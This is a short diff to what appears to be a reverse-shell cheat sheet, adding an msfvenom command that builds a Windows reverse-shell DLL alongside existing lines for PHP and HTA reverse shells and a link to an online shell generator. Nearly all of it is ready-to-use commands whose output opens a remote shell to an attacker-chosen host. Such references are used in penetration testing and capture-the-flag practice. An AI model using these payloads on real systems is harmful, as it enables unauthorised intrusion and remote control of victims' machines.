@@ -44,6 +44,12 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh > shell.hta
 ```
 
+#### DLL
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
+```
+
+
 #### Online Generator
 <https://www.revshells.com/>
 
